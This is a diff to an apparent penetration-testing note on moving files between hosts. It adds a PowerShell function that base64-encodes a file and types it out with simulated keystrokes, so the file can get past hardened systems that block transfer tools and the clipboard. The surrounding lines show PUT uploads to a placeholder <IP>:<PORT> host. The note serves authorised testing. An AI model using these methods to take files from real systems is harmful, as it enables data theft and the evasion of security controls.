@@ -136,7 +136,32 @@ Invoke-RestMethod -Method PUT -Uri "http://<IP>:<PORT>/<FILE>" -Infile <FILE_PAT
 
 Invoke-WebRequest -Method PUT -Uri "http://<IP>:<PORT>/<FILE>" -Body <$VARIABLE>
 Invoke-RestMethod -Method PUT -Uri "http://<IP>:<PORT>/<FILE>" -Body <$VARIABLE>
-```  
+```
+
+###### [Windows] Simulated keyboard
+
+A keyboard can be simulated, by emulating keystrokes, to send `base64`-encoded
+files on specifically hardened systems (that restrict the usage of the tools
+and utilities presented in this note and disable the clipboard). The simulated
+keystrokes may be used to write a file or in directly outputted into a
+PowerShell variable inside an interactive terminal.
+
+The transfer time is however overwhelming long and this method is not adapted
+to larger files.
+
+```
+Function Invoke-SimulateKeyboard ($FilePath) {
+    $EncodedData = [Convert]::ToBase64String([IO.File]::ReadAllBytes($FilePath))
+
+    TimeOut 2
+
+    $EncodedData.ToCharArray() | ForEach-Object {[System.Windows.Forms.SendKeys]::SendWait($_)}
+}
+
+$FilePath = "C:\Users\PENT08H\Documents\WavestonePentest\Simulate-Keyboard.ps1"
+
+Invoke-SimulateKeyboard $FilePath
+```
 
 ### Client side / file receiver
 
